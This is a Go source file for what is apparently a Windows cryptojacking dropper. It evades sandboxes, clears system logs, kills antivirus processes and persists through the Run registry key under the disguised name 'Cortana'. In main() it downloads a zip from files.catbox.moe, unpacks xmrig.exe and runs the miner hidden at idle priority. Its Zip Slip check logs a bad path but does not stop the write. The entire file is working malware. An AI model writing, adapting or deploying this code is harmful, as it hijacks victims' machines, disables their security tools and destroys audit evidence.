package main

import (
	"archive/zip"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/redcode-labs/Coldfire"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Func that downloads files
func downloadFile(filepath string, url string) {
	// Create the file
	out, err := os.Create(filepath)
	log.Println(err)
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	log.Println(err)
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		log.Println(resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	log.Println(err)
}

// Func that unzips the source file and archives within that file
func unzipSource(source, destination string) {
	// 1. Open the zip file
	reader, err := zip.OpenReader(source)
	log.Println(err)
	defer reader.Close()

	// 2. Get the absolute destination path
	destination, err = filepath.Abs(destination)
	log.Println(err)

	// 3. Iterate over zip files inside the archive and unzip each of them
	for _, f := range reader.File {
		unzipFile(f, destination)
	}
}

// Func that unzips files
func unzipFile(f *zip.File, destination string) {
	// 4. Check if file paths are not vulnerable to Zip Slip
	filePath := filepath.Join(destination, f.Name)
	if !strings.HasPrefix(filePath, filepath.Clean(destination)+string(os.PathSeparator)) {
		log.Printf("invalid file path: %s", filePath)
	}

	// 5. Create directory tree
	if f.FileInfo().IsDir() {
		err := os.MkdirAll(filePath, os.ModePerm)
		log.Println(err)
	}

	err := os.MkdirAll(filepath.Dir(filePath), os.ModePerm)
	log.Println(err)

	// 6. Create a destination file for unzipped content
	destinationFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
	log.Println(err)
	defer destinationFile.Close()

	// 7. Unzip the content of a file and copy it to the destination file
	zippedFile, err := f.Open()
	log.Println(err)
	defer zippedFile.Close()

	_, err = io.Copy(destinationFile, zippedFile)
	log.Println(err)
}

// Func that starts the xmrig command/process
func startCommand(dir string) {
	cmd := exec.Command(filepath.Join(dir, "cortanacache", "xmrig.exe"), "-c", filepath.Join(dir, "cortanacache", "config.json"))

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
	}

	handle, err := syscall.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(cmd.Process.Pid))
	if err != nil {
		log.Println("Error getting process handle:", err)
	}

	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		log.Println("Error setting process priority:", err)
	}

	// And when you need to wait for the command to finish:
	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}

// Func that puts this binary into autostart
func autoStart() {
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	log.Println(err)
	defer key.Close()

	loc, _ := os.Executable()
	err = key.SetStringValue("Cortana", loc)
	log.Println(err)
}

// Main func that initializes everything
func main() {
	// Check if is running in a sandbox
	if coldfire.SandboxAll() {
		log.Println("DONT RUN ME IN A VIRTUAL MACHINE, IT MAKES ME SAD")
		os.Exit(1)
	}

	// Clear system logs
	defer coldfire.ClearLogs()

	// Delete the old log file
	os.Remove("cortanalog.txt")

	// Log everything to file
	f, err := os.OpenFile("cortanalog.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	defer f.Close()
	log.SetOutput(f)

	// Kill AV processes
	err = coldfire.PkillAv()
	log.Println(err)

	// Add to autostart
	autoStart()

	// Create temp directory
	dir, err := ioutil.TempDir("", "cortanacache")
	log.Println(err)
	defer os.RemoveAll(dir)

	// Download the miner
	downloadFile(filepath.Join(dir, "cortanacache.zip"), "https://files.catbox.moe/g9ivbr.zip")

	// Unzip the miner
	unzipSource(filepath.Join(dir, "cortanacache.zip"), filepath.Join(dir, "cortanacache"))

	// Start the miner
	startCommand(dir)
}
